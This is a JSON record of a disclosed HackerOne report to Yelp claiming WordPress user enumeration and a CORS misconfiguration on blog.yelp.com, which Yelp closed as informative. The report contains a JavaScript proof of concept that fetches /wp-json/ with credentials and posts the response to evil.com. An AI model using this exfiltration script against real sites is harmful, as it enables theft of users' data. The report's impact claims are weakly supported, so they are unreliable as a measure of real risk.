@@ -1,0 +1,199 @@
+{
+  "id": 779656,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Nzk2NTY=",
+  "url": "https://hackerone.com/reports/779656",
+  "title": "Multiple Vulnerabilities in (*.blog.yelp.com) - Leakage user admin Sensitive Exposure",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2020-01-21T19:04:03.458Z",
+  "submitted_at": "2020-01-21T19:04:03.458Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "sourceflow",
+    "url": "/sourceflow",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/oSheUgan3kyusfKqtzs71wLr/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 545,
+    "url": "https://hackerone.com/yelp",
+    "handle": "yelp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Yelp",
+      "twitter_handle": "",
+      "website": "https://www.yelp.com",
+      "about": "Connecting people to great local businesses in communities around the world."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-01-29T19:42:39.088Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-01-29T19:35:29.499Z",
+  "team_member_agreed_on_going_public_at": "2020-01-29T19:42:38.998Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Hi!** Team @yelp, We Found Multiple Vulnerabilities in you websites , Username Admin Login Sensitive Exposure\nRefferals Hackerone [#753725]\n\nPlatform(s) Affected: [website]\n*. https://blog.yelp.com/wp-json/ ``user-admin sensitive exposure``\n*. https://blog.yelp.com/wp-login.php ``Admin-Page disclousure``\n\n##Steps To Reproduce:\n1) Open URL Vulnerable : https://blog.yelp.com/wp-json/\n**Request**\n```\nGET /wp-json/ HTTP/1.1\nHost: blog.yelp.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nOrigin: http://127.0.0.1:8080\nDNT: 1\nConnection: close\nCookie: __cfduid=dc46e8e6b98de504f3f044d1b9b3b8a191579632970\nUpgrade-Insecure-Requests: 1\n```\n**Vulnerable Details**\nAdd Parameter ``Origin`` in Request Header\n``Origin`` http://127.0.0.1:8080\n**Exploit Cross Origin Resource Sharing Misconfiguration**\n```javascript\n<!DOCTYPE html>\n<html>\n<body>\n<center>\n<h3>Steal customer data!</h3>\n<html>\n<body>\n<button type='button' onclick='cors()'>Exploit</button>\n<p id='demo'></p>\n<script>\nfunction cors() {\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\nif (this.readyState == 4 && this.status == 200) {\nvar a = this.responseText; // Sensitive data from blog.yelp.com about user account\ndocument.getElementById(\"demo\").innerHTML = a;\nxhttp.open(\"POST\", \"http://evil.com\", true);// Sending that data to Attacker's website\nxhttp.withCredentials = true;\nconsole.log(a);\nxhttp.send(\"data=\"+a);\n}\n};\nxhttp.open(\"GET\", \"https://blog.yelp.com/wp-json/\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n}\n</script>\n</body>\n</html>\n```\n2) save file as ``.html`` , and open in your browser\n3) **Boom** Sensitive has been Exposure\n\n**Additional information**\n```javascript\n\t\nname\t\"Yelp\"\ndescription\t\"Official Blog\"\nurl\t\"https://blog.yelp.com\"\nhome\t\"https://blog.yelp.com\"\ngmt_offset\t-8\ntimezone_string\t\"America/Los_Angeles\"\nnamespaces\t[…]\nauthentication\t[]\nroutes\t\n/\t{…}\n/oembed/1.0\t{…}\n/oembed/1.0/embed\t{…}\n/oembed/1.0/proxy\t{…}\n//wpe_sign_on_plugin/v1\t{…}\n/wpe_sign_on_plugin/v1/login\t{…}\n/redirection/v1\t{…}\n/redirection/v1/redirect\t{…}\n/redirection/v1/redirect/(?P<id>[\\d]+)\t{…}\n/redirection/v1/bulk/redirect/(?P<bulk>delete|enable|disable|reset)\t{…}\n/redirection/v1/group\t{…}\n/redirection/v1/group/(?P<id>[\\d]+)\t{…}\n/redirection/v1/bulk/group/(?P<bulk>delete|enable|disable)\t{…}\n/redirection/v1/log\t{…}\n/redirection/v1/bulk/log/(?P<bulk>delete)\t{…}\n/redirection/v1/404\t{…}\n/redirection/v1/bulk/404/(?P<bulk>delete)\t{…}\n/redirection/v1/setting\t{…}\n/redirection/v1/plugin\t{…}\n/redirection/v1/plugin/delete\t{…}\n/redirection/v1/plugin/test\t{…}\n/redirection/v1/plugin/post\t{…}\n/redirection/v1/plugin/database\t{…}\n/redirection/v1/import/file/(?P<group_id>\\d+)\t{…}\n/redirection/v1/import/plugin\t{…}\n/redirection/v1/import/plugin/(?P<plugin>.*?)\t{…}\n/redirection/v1/export/(?P<module>1|2|3|all)/(?P<format>csv|apache|nginx|json)\t{…}\n/yoast/v1\t{…}\n/yoast/v1/configurator\t{…}\n/yoast/v1/reindex_posts\t{…}\n/yoast/v1/ryte\t{…}\n/yoast/v1/indexables/(?P<object_type>\\w+)/(?P<object_id>\\d+)\t{…}\n/yoast/v1/file_size\t{…}\n/yoast/v1/statistics\t{…}\n/yoast/v1/myyoast\t{…}\n/yoast/v1/myyoast/connect\t{…}\n/wp-rest-api-log\t{…}\n/wp-rest-api-log/entries\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)\t{…}\n/wp-rest-api-log/entry\t{…}\n/wp-rest-api-log/routes\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>body_params)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>query_params)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>body)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>request)/(?P<property>headers)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>response)/(?P<property>body)/download\t{…}\n/wp-rest-api-log/entry/(?P<id>[\\d]+)/(?P<rr>response)/(?P<property>headers)/download\t{…}\n/metaslider/v1\t{…}\n/metaslider/v1/slideshow/all\t{…}\n/metaslider/v1/slideshow/preview\t{…}\n/metaslider/v1/slideshow/save\t{…}\n/metaslider/v1/slideshow/delete\t{…}\n/metaslider/v1/slideshow/duplicate\t{…}\n/metaslider/v1/themes/all\t{…}\n/metaslider/v1/themes/custom\t{…}\n/metaslider/v1/themes/set\t{…}\n/metaslider/v1/import/images\t{…}\n/metaslider/v1/tour/status\t{…}\n/metaslider/v1/settings/save-single\t{…}\n/metaslider/v1/settings/save-global\t{…}\n/regenerate-thumbnails/v1\t{…}\n/regenerate-thumbnails/v1/regenerate/(?P<id>[\\d]+)\t{…}\n/regenerate-thumbnails/v1/attachmentinfo/(?P<id>[\\d]+)\t{…}\n/regenerate-thumbnails/v1/featuredimages\t{…}\n/wp/v2\t{…}\n/wp/v2/posts\t{…}\n/wp/v2/posts/(?P<id>[\\d]+)\t{…}\n/wp/v2/posts/(?P<parent>[\\d]+)/revisions\t{…}\n/wp/v2/posts/(?P<parent>[\\d]+)/revisions/(?P<id>[\\d]+)\t{…}\n/wp/v2/posts/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/posts/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/pages\t{…}\n/wp/v2/pages/(?P<id>[\\d]+)\t{…}\n/wp/v2/pages/(?P<parent>[\\d]+)/revisions\t{…}\n/wp/v2/pages/(?P<parent>[\\d]+)/revisions/(?P<id>[\\d]+)\t{…}\n/wp/v2/pages/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/pages/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/media\t{…}\n/wp/v2/media/(?P<id>[\\d]+)\t{…}\n/wp/v2/blocks\t{…}\n/wp/v2/blocks/(?P<id>[\\d]+)\t{…}\n/wp/v2/blocks/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/blocks/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/wp-rest-api-log\t{…}\n/wp/v2/wp-rest-api-log/(?P<id>[\\d]+)\t{…}\n/wp/v2/wp-rest-api-log/(?P<id>[\\d]+)/autosaves\t{…}\n/wp/v2/wp-rest-api-log/(?P<parent>[\\d]+)/autosaves/(?P<id>[\\d]+)\t{…}\n/wp/v2/types\t{…}\n/wp/v2/types/(?P<type>[\\w-]+)\t{…}\n/wp/v2/statuses\t{…}\n/wp/v2/statuses/(?P<status>[\\w-]+)\t{…}\n/wp/v2/taxonomies\t{…}\n/wp/v2/taxonomies/(?P<taxonomy>[\\w-]+)\t{…}\n/wp/v2/categories\t{…}\n/wp/v2/categories/(?P<id>[\\d]+)\t{…}\n/wp/v2/tags\t{…}\n/wp/v2/tags/(?P<id>[\\d]+)\t{…}\n/wp/v2/users\t{…}\n/wp/v2/users/(?P<id>[\\d]+)\t{…}\n/wp/v2/users/me\t{…}\n/wp/v2/comments\t{…}\n/wp/v2/comments/(?P<id>[\\d]+)\t{…}\n/wp/v2/search\t{…}\n/wp/v2/block-renderer/(?P<name>core/block)\t{…}\n/wp/v2/block-renderer/(?P<name>core/latest-comments)\t{…}\n/wp/v2/block-renderer/(?P<name>core/archives)\t{…}\n/wp/v2/block-renderer/(?P<name>core/calendar)\t{…}\n/wp/v2/block-renderer/(?P<name>core/categories)\t{…}\n/wp/v2/block-renderer/(?P<name>core/latest-posts)\t{…}\n/wp/v2/block-renderer/(?P<name>core/rss)\t{…}\n/wp/v2/block-renderer/(?P<name>core/search)\t{…}\n/wp/v2/block-renderer/(?P<name>core/shortcode)\t{…}\n/wp/v2/block-renderer/(?P<name>core/tag-cloud)\t{…}\n/wp/v2/settings\t{…}\n/wp/v2/themes\t{…}\n_links\t{…}\n```\n##POC Screenshots/Videos:\n  * F691740\n  * F691742\n  * F691741\n\n## Impact\n\n1. This website using Wordpress , so developer forget to disable the link that can view information of admin user. By access to this link, attacker can get all username and other information of user admin: Wordpress user admin sensitive-exposure\n2. Cross Origin Resource Sharing Misconfiguration",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 691740,
+      "file_name": "ScreenshotsYelpPOC1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dHVG6YvQSFPLzj4CA8m2dYxD?response-content-disposition=attachment%3B%20filename%3D%22ScreenshotsYelpPOC1.png%22%3B%20filename%2A%3DUTF-8%27%27ScreenshotsYelpPOC1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQOGJFWRT%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051527Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDuRizZArxkECBuBOjsP3a1K9rwXiVjunRVoV%2FicNR%2FDQIhAMMb%2FB%2FCjHDPpEB5Kxw56J0ExgAaiAeeemquaGA4WsL1KrEFCH4QAxoMMDEzNjE5Mjc0ODQ5IgxppT0J%2Bw7l8%2BZzZAEqjgX3E4OhXkOWiPCo%2BOh9V3i7vaeUyQlLPE9kS1oO3yf7SImJO%2FtudrcKdP3SNebxknMIuATx2QVs%2Bco9utmQ29UGiTCVRGbmNR%2BzkN%2FW%2FGXITiidATCE7qefffYPT0mBT4NhWi5OC1DKP3YGOs3gkP%2FYF90VZim%2FoAjOmuW4avLXMR91l3Rnp%2FZor56kzh4qVj3%2FB9Ob%2FDaOZPoc8L7tbZY5W%2BKm06UdlH38QY4D4g4RUrAM0wKuiYdOeAeinmz%2Bpe88wQ7HuXarR7a6IO2rErLvi2HbRinkhslyfMEHHj3%2BbI4J0l0lyNCd4WYMqlY5ljzMCMuCy9tm6Gulo4KJ8l0vuC04beQqEAAcw8BXN%2BH6cyg65JPR8d9HhWm64QHPFAmjWzafNSosWkVQdgkPP4wQ2WSFNdJEugcC1%2FeLjJEBwUTyTXIV%2FWL1PE3oGZMM17KYxxnfnxL32joxVnmhBXQ0M%2F5eFUV4UfJgmhy%2F5HgTFLx1PMiGx%2FkYS3%2F5%2Bxsyt2oUm%2Fsn1M6rLHvIVENhipghOEfyEcQoAEAaFDWXapkDADp6nz491UV8FtogOBYQKmknAnMKfBUeH3TjeAFevXdl%2B7g7g0AVq%2Bmuq3JxWPa%2BYuzCuyJVpoFtwg64PE06VSQ7QXuzTVo0wrirYuIyOVunVgRkWUA9kY4dAOE%2Bi3TJsrKdBm7qbd%2BWXq1BWKZQw%2FX2jlCuWTxhsPTBPtcBZgACK1rvldDQWiVgoP1wdK18yQd0ef5Dw9exagjg35RahRWk%2FJiTvERzMlJFktd6fmqBxr%2BmcZa8H6R30J3Ju4jMx5lk%2Fkd%2Fez%2FabTWgWOg4ZgweRwETxnGxrHOhmiiNIWDQwNBmghxj%2Fg6%2ByUaI6Esws7W30gY6sAGYd3QSbVw0I8lRlJoTyEU7aRMbz4UTfB%2BqNOzjBcVyDr7rrj0CslwTLuQ9wDpshRq3%2BPqf3VDzZ%2FbKdOfZ5S%2BB0m%2FzEfX5nEuM79ZPMHem547cKKQB%2BvrbG0mNYDVkyF6CtKfVlz5B3%2Bm2RhR7CsRmuU1QmSN5K1FyPsLzYAGippTCS%2BgxQvScmeyQGFrIBScm3B5kXkFxo4m5ptz6pPf0NLR8VObjKz4RAfkfG767WQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=46da19c7e71a50ce1fa7898e89550ad6c766e347732756993b77902e2a64fccf",
+      "file_size": 46815,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 691741,
+      "file_name": "ScreenshotsYelpPOC.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Dv3DJdtCxp7RwgSYvPyWeB7r?response-content-disposition=attachment%3B%20filename%3D%22ScreenshotsYelpPOC.png%22%3B%20filename%2A%3DUTF-8%27%27ScreenshotsYelpPOC.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQOGJFWRT%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051527Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDuRizZArxkECBuBOjsP3a1K9rwXiVjunRVoV%2FicNR%2FDQIhAMMb%2FB%2FCjHDPpEB5Kxw56J0ExgAaiAeeemquaGA4WsL1KrEFCH4QAxoMMDEzNjE5Mjc0ODQ5IgxppT0J%2Bw7l8%2BZzZAEqjgX3E4OhXkOWiPCo%2BOh9V3i7vaeUyQlLPE9kS1oO3yf7SImJO%2FtudrcKdP3SNebxknMIuATx2QVs%2Bco9utmQ29UGiTCVRGbmNR%2BzkN%2FW%2FGXITiidATCE7qefffYPT0mBT4NhWi5OC1DKP3YGOs3gkP%2FYF90VZim%2FoAjOmuW4avLXMR91l3Rnp%2FZor56kzh4qVj3%2FB9Ob%2FDaOZPoc8L7tbZY5W%2BKm06UdlH38QY4D4g4RUrAM0wKuiYdOeAeinmz%2Bpe88wQ7HuXarR7a6IO2rErLvi2HbRinkhslyfMEHHj3%2BbI4J0l0lyNCd4WYMqlY5ljzMCMuCy9tm6Gulo4KJ8l0vuC04beQqEAAcw8BXN%2BH6cyg65JPR8d9HhWm64QHPFAmjWzafNSosWkVQdgkPP4wQ2WSFNdJEugcC1%2FeLjJEBwUTyTXIV%2FWL1PE3oGZMM17KYxxnfnxL32joxVnmhBXQ0M%2F5eFUV4UfJgmhy%2F5HgTFLx1PMiGx%2FkYS3%2F5%2Bxsyt2oUm%2Fsn1M6rLHvIVENhipghOEfyEcQoAEAaFDWXapkDADp6nz491UV8FtogOBYQKmknAnMKfBUeH3TjeAFevXdl%2B7g7g0AVq%2Bmuq3JxWPa%2BYuzCuyJVpoFtwg64PE06VSQ7QXuzTVo0wrirYuIyOVunVgRkWUA9kY4dAOE%2Bi3TJsrKdBm7qbd%2BWXq1BWKZQw%2FX2jlCuWTxhsPTBPtcBZgACK1rvldDQWiVgoP1wdK18yQd0ef5Dw9exagjg35RahRWk%2FJiTvERzMlJFktd6fmqBxr%2BmcZa8H6R30J3Ju4jMx5lk%2Fkd%2Fez%2FabTWgWOg4ZgweRwETxnGxrHOhmiiNIWDQwNBmghxj%2Fg6%2ByUaI6Esws7W30gY6sAGYd3QSbVw0I8lRlJoTyEU7aRMbz4UTfB%2BqNOzjBcVyDr7rrj0CslwTLuQ9wDpshRq3%2BPqf3VDzZ%2FbKdOfZ5S%2BB0m%2FzEfX5nEuM79ZPMHem547cKKQB%2BvrbG0mNYDVkyF6CtKfVlz5B3%2Bm2RhR7CsRmuU1QmSN5K1FyPsLzYAGippTCS%2BgxQvScmeyQGFrIBScm3B5kXkFxo4m5ptz6pPf0NLR8VObjKz4RAfkfG767WQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6341eb0ea49485499a8c3b04999fd0ef58e090330db5785fa497b266144a6a13",
+      "file_size": 368579,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 691742,
+      "file_name": "ScreenshotsYelpPOC2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/B49WhxwNCJTiekeuLTsvF1bQ?response-content-disposition=attachment%3B%20filename%3D%22ScreenshotsYelpPOC2.png%22%3B%20filename%2A%3DUTF-8%27%27ScreenshotsYelpPOC2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQOGJFWRT%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051527Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDuRizZArxkECBuBOjsP3a1K9rwXiVjunRVoV%2FicNR%2FDQIhAMMb%2FB%2FCjHDPpEB5Kxw56J0ExgAaiAeeemquaGA4WsL1KrEFCH4QAxoMMDEzNjE5Mjc0ODQ5IgxppT0J%2Bw7l8%2BZzZAEqjgX3E4OhXkOWiPCo%2BOh9V3i7vaeUyQlLPE9kS1oO3yf7SImJO%2FtudrcKdP3SNebxknMIuATx2QVs%2Bco9utmQ29UGiTCVRGbmNR%2BzkN%2FW%2FGXITiidATCE7qefffYPT0mBT4NhWi5OC1DKP3YGOs3gkP%2FYF90VZim%2FoAjOmuW4avLXMR91l3Rnp%2FZor56kzh4qVj3%2FB9Ob%2FDaOZPoc8L7tbZY5W%2BKm06UdlH38QY4D4g4RUrAM0wKuiYdOeAeinmz%2Bpe88wQ7HuXarR7a6IO2rErLvi2HbRinkhslyfMEHHj3%2BbI4J0l0lyNCd4WYMqlY5ljzMCMuCy9tm6Gulo4KJ8l0vuC04beQqEAAcw8BXN%2BH6cyg65JPR8d9HhWm64QHPFAmjWzafNSosWkVQdgkPP4wQ2WSFNdJEugcC1%2FeLjJEBwUTyTXIV%2FWL1PE3oGZMM17KYxxnfnxL32joxVnmhBXQ0M%2F5eFUV4UfJgmhy%2F5HgTFLx1PMiGx%2FkYS3%2F5%2Bxsyt2oUm%2Fsn1M6rLHvIVENhipghOEfyEcQoAEAaFDWXapkDADp6nz491UV8FtogOBYQKmknAnMKfBUeH3TjeAFevXdl%2B7g7g0AVq%2Bmuq3JxWPa%2BYuzCuyJVpoFtwg64PE06VSQ7QXuzTVo0wrirYuIyOVunVgRkWUA9kY4dAOE%2Bi3TJsrKdBm7qbd%2BWXq1BWKZQw%2FX2jlCuWTxhsPTBPtcBZgACK1rvldDQWiVgoP1wdK18yQd0ef5Dw9exagjg35RahRWk%2FJiTvERzMlJFktd6fmqBxr%2BmcZa8H6R30J3Ju4jMx5lk%2Fkd%2Fez%2FabTWgWOg4ZgweRwETxnGxrHOhmiiNIWDQwNBmghxj%2Fg6%2ByUaI6Esws7W30gY6sAGYd3QSbVw0I8lRlJoTyEU7aRMbz4UTfB%2BqNOzjBcVyDr7rrj0CslwTLuQ9wDpshRq3%2BPqf3VDzZ%2FbKdOfZ5S%2BB0m%2FzEfX5nEuM79ZPMHem547cKKQB%2BvrbG0mNYDVkyF6CtKfVlz5B3%2Bm2RhR7CsRmuU1QmSN5K1FyPsLzYAGippTCS%2BgxQvScmeyQGFrIBScm3B5kXkFxo4m5ptz6pPf0NLR8VObjKz4RAfkfG767WQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6409f8e746b131f0ee5e3b4a44ffbbf5f556df630378ddf9b353d9ea1552884d",
+      "file_size": 100483,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "tess",
+    "thalaivar304",
+    "pr0f0x01",
+    "bb00x",
+    "exception",
+    "chr0ll0xo",
+    "sourceflow",
+    "0xm1racle",
+    "lmhu",
+    "0xrobot",
+    "and 13 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "779656",
+  "votes": 23,
+  "latest_disclosable_activity_at": "2020-01-29T19:42:39.104Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T13:15:28.052537",
+    "source": "https://hackerone.com/reports/779656.json",
+    "report_id": 779656
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Nzk2NTY=",
+    "databaseId": "779656",
+    "title": "Multiple Vulnerabilities in (*.blog.yelp.com) - Leakage user admin Sensitive Exposure",
+    "url": "https://hackerone.com/reports/779656",
+    "state": null,
+    "substate": "informative",
+    "disclosed_at": "2020-01-29T19:42:39.088Z",
+    "created_at": "2020-01-21T19:04:03.458Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY1",
+      "name": "Business Logic Errors",
+      "external_id": "cwe-840"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "sourceflow"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU0NQ==",
+      "handle": "yelp",
+      "name": "Yelp",
+      "url": "https://hackerone.com/yelp",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzc3OTY1Ng==",
+    "_id": "779656",
+    "disclosed": true,
+    "votes": 23,
+    "latest_disclosable_activity_at": "2020-01-29T19:42:39.104Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Nzk2NTY=",
+      "databaseId": "779656",
+      "title": "Multiple Vulnerabilities in (*.blog.yelp.com) - Leakage user admin Sensitive Exposure",
+      "url": "https://hackerone.com/reports/779656",
+      "disclosed_at": "2020-01-29T19:42:39.088Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU0NQ==",
+      "handle": "yelp",
+      "name": "Yelp",
+      "url": "https://hackerone.com/yelp",
+      "currency": "usd"
+    }
+  }
+}
